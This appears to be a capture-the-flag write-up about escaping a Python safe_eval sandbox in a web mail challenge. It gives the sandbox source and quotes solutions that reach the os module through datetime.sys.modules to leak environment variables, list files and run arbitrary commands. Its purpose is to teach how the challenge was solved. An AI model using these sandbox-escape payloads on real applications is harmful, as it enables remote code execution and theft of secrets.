# Vibe Web Mail

```
Vibe coder makes a vibing web mail!

http://65.109.209.215:5000
```

Attachment:

```python
# safe_eval.py
import dis
import logging
import functools
from opcode import opmap, opname
from types import CodeType
import types
import datetime
import ctypes

_logger = logging.getLogger(__name__)

unsafe_eval = eval

_BUILTINS = {
    'datetime': datetime,
    'True': True,
    'False': False,
    'None': None,
    'bytes': bytes,
    'str': str,
    'unicode': str,
    'bool': bool,
    'int': int,
    'float': float,
    'enumerate': enumerate,
    'dict': dict,
    'list': list,
    'tuple': tuple,
    'map': map,
    'abs': abs,
    'min': min,
    'max': max,
    'sum': sum,
    'reduce': functools.reduce,
    'filter': filter,
    'sorted': sorted,
    'round': round,
    'len': len,
    'repr': repr,
    'set': set,
    'all': all,
    'any': any,
    'ord': ord,
    'chr': chr,
    'divmod': divmod,
    'isinstance': isinstance,
    'range': range,
    'xrange': range,
    'zip': zip,
    'Exception': Exception,
}

def to_opcodes(opnames, _opmap=opmap):
    for x in opnames:
        if x in _opmap:
            yield _opmap[x]

_BLACKLIST = set(to_opcodes([
    'IMPORT_STAR', 'IMPORT_NAME', 'IMPORT_FROM',
    'STORE_ATTR', 'DELETE_ATTR',
    'STORE_GLOBAL', 'DELETE_GLOBAL',
]))

_CONST_OPCODES = set(to_opcodes([
    'POP_TOP', 'ROT_TWO', 'ROT_THREE', 'ROT_FOUR', 'DUP_TOP', 'DUP_TOP_TWO',
    'LOAD_CONST',
    'RETURN_VALUE',
    'BUILD_LIST', 'BUILD_MAP', 'BUILD_TUPLE', 'BUILD_SET',
    'BUILD_CONST_KEY_MAP',
    'LIST_EXTEND', 'SET_UPDATE',
    'COPY', 'SWAP',
    'RESUME',
    'RETURN_CONST',
    'TO_BOOL',
])) - _BLACKLIST

_operations = [
    'POWER', 'MULTIPLY',
    'FLOOR_DIVIDE', 'TRUE_DIVIDE', 'MODULO', 'ADD',
    'SUBTRACT', 'LSHIFT', 'RSHIFT', 'AND', 'XOR', 'OR',
]

_EXPR_OPCODES = _CONST_OPCODES.union(to_opcodes([
    'UNARY_POSITIVE', 'UNARY_NEGATIVE', 'UNARY_NOT', 'UNARY_INVERT',
    *('BINARY_' + op for op in _operations), 'BINARY_SUBSCR',
    *('INPLACE_' + op for op in _operations),
    'BUILD_SLICE',
    'LIST_APPEND', 'MAP_ADD', 'SET_ADD',
    'COMPARE_OP',
    'IS_OP', 'CONTAINS_OP',
    'DICT_MERGE', 'DICT_UPDATE',
    'GEN_START',
    'BINARY_OP',
    'BINARY_SLICE',
])) - _BLACKLIST

_SAFE_OPCODES = _EXPR_OPCODES.union(to_opcodes([
    'POP_BLOCK', 'POP_EXCEPT',
    'SETUP_LOOP', 'SETUP_EXCEPT', 'BREAK_LOOP', 'CONTINUE_LOOP',
    'EXTENDED_ARG', 
    'MAKE_FUNCTION', 'CALL_FUNCTION', 'CALL_FUNCTION_KW', 'CALL_FUNCTION_EX',
    'CALL_METHOD', 'LOAD_METHOD',
    'GET_ITER', 'FOR_ITER', 'YIELD_VALUE',
    'JUMP_FORWARD', 'JUMP_ABSOLUTE', 'JUMP_BACKWARD',
    'JUMP_IF_FALSE_OR_POP', 'JUMP_IF_TRUE_OR_POP', 'POP_JUMP_IF_FALSE', 'POP_JUMP_IF_TRUE',
    'SETUP_FINALLY', 'END_FINALLY',
    'BEGIN_FINALLY', 'CALL_FINALLY', 'POP_FINALLY',
    'RAISE_VARARGS', 'LOAD_NAME', 'STORE_NAME', 'DELETE_NAME', 'LOAD_ATTR',
    'LOAD_FAST', 'STORE_FAST', 'DELETE_FAST', 'UNPACK_SEQUENCE',
    'STORE_SUBSCR',
    'LOAD_GLOBAL',
    'RERAISE', 'JUMP_IF_NOT_EXC_MATCH',
    'PUSH_NULL', 'PRECALL', 'CALL', 'KW_NAMES',
    'POP_JUMP_FORWARD_IF_FALSE', 'POP_JUMP_FORWARD_IF_TRUE',
    'POP_JUMP_BACKWARD_IF_FALSE', 'POP_JUMP_BACKWARD_IF_TRUE',
    'POP_JUMP_FORWARD_IF_NONE', 'POP_JUMP_BACKWARD_IF_NONE',
    'POP_JUMP_FORWARD_IF_NOT_NONE', 'POP_JUMP_BACKWARD_IF_NOT_NONE',
    'CHECK_EXC_MATCH',
    'RETURN_GENERATOR',
    'PUSH_EXC_INFO',
    'NOP',
    'FORMAT_VALUE', 'BUILD_STRING',
    'END_FOR',
    'LOAD_FAST_AND_CLEAR', 'LOAD_FAST_CHECK',
    'POP_JUMP_IF_NOT_NONE', 'POP_JUMP_IF_NONE',
    'CALL_INTRINSIC_1',
    'STORE_SLICE',
    'CALL_KW', 'LOAD_FAST_LOAD_FAST',
    'STORE_FAST_STORE_FAST', 'STORE_FAST_LOAD_FAST',
    'CONVERT_VALUE', 'FORMAT_SIMPLE', 'FORMAT_WITH_SPEC',
    'SET_FUNCTION_ATTRIBUTE',
])) - _BLACKLIST

_UNSAFE_ATTRIBUTES = [
    'f_builtins', 'f_code', 'f_globals', 'f_locals',
    'func_code', 'func_globals',
    'co_code', '_co_code_adaptive',
    'mro',
    'tb_frame',
    'gi_code', 'gi_frame', 'gi_yieldfrom',
    'cr_await', 'cr_code', 'cr_frame',
    'ag_await', 'ag_code', 'ag_frame',
]

def safe_eval(expr, globals_dict=None, locals_dict=None, mode="eval", nocopy=False, locals_builtins=False, filename=None):
    if type(expr) is CodeType:
        raise TypeError("safe_eval does not allow direct evaluation of code objects.")

    if not nocopy:
        if (globals_dict is not None and type(globals_dict) is not dict) \
                or (locals_dict is not None and type(locals_dict) is not dict):
            _logger.warning(
                "Looks like you are trying to pass a dynamic environment, "
                "you should probably pass nocopy=True to safe_eval().")
        if globals_dict is not None:
            globals_dict = dict(globals_dict)
        if locals_dict is not None:
            locals_dict = dict(locals_dict)

    check_values(globals_dict)
    check_values(locals_dict)

    if globals_dict is None:
        globals_dict = {}

    globals_dict['__builtins__'] = dict(_BUILTINS)
    if locals_builtins:
        if locals_dict is None:
            locals_dict = {}
        locals_dict.update(_BUILTINS)
    c = test_expr(expr, _SAFE_OPCODES, mode=mode, filename=filename)
    try:
        return unsafe_eval(c, globals_dict, locals_dict)
    except Exception as e:
        raise ValueError('%r while evaluating\n%r' % (e, expr))
    
def check_values(d):
    if not d:
        return d
    for v in d.values():
        if isinstance(v, types.ModuleType):
            raise TypeError(f"""Module {v} can not be used in evaluation contexts.""")
    return d
                            
def test_expr(expr, allowed_codes, mode="eval", filename=None):
    try:
        if mode == 'eval':
            expr = expr.strip()
        code_obj = compile(expr, filename or "", mode)
    except (SyntaxError, TypeError, ValueError):
        raise
    except Exception as e:
        raise ValueError('%r while compiling\n%r' % (e, expr))
    assert_valid_codeobj(allowed_codes, code_obj, expr)
    return code_obj

def assert_valid_codeobj(allowed_codes, code_obj, expr):
    assert_no_dunder_name(code_obj, expr)

    code_codes = {i.opcode for i in dis.get_instructions(code_obj)}
    if not allowed_codes >= code_codes:
        raise ValueError("forbidden opcode(s) in %r: %s" % (expr, ', '.join(opname[x] for x in (code_codes - allowed_codes))))

    for const in code_obj.co_consts:
        if isinstance(const, CodeType):
            assert_valid_codeobj(allowed_codes, const, 'lambda')

def assert_no_dunder_name(code_obj, expr):
    for name in code_obj.co_names:
        if "__" in name or name in _UNSAFE_ATTRIBUTES:
            raise NameError('Access to forbidden name %r (%r)' % (name, expr))
```

The `safe_eval` is called for the email body. So we need to leak the environment variables (part 1) or run arbitrary commands remotely (part 2). However, only some builtins are allowed.

Writeups on Discord:

@S450R1 for part 1 & 2:

```python
Vibe mail 01,
Send datetime.sys.modules["os"].environ["FLAG"] in content to one of your accounts, you'll get the flag

vibe mail 02,
Send datetime.sys.modules["os"].system("ls / > static/ls.txt") to whatever
Then access /static/ls.txt to get the executable name of the flag reader then
Send datetime.sys.modules["os"].system("/kihjdusxns543f33ljqosm7r6jnwswyn > static/flag.txt") and access /static/flag.txt
```

@Shah_Ji for part 2:

```python
datetime.sys.modules['posix'].listdir('/')
to print root we get:
 ['run', 'opt', 'sys', 'sbin', 'var', 'mnt', 'bin', 'tmp', 'proc', 'etc', 'home', 'srv', 'media', 'dev', 'lib64', 'usr', 'boot', 'root', 'lib', 'app', '.dockerenv', 'nekt81awwxsa4dnr3qgix9g1vcxwxb99']

then we use :
datetime.sys.modules['os'].popen('/nekt81awwxsa4dnr3qgix9g1vcxwxb99').read()

to get the flag
```

So the critical observation here, is that `sys` can be accessed from `datetime` module in Python 3.11. However, it is sensitive to Python version:

- 3.8/3.9/3.10/3.11: working
- 3.12/3.13: not working
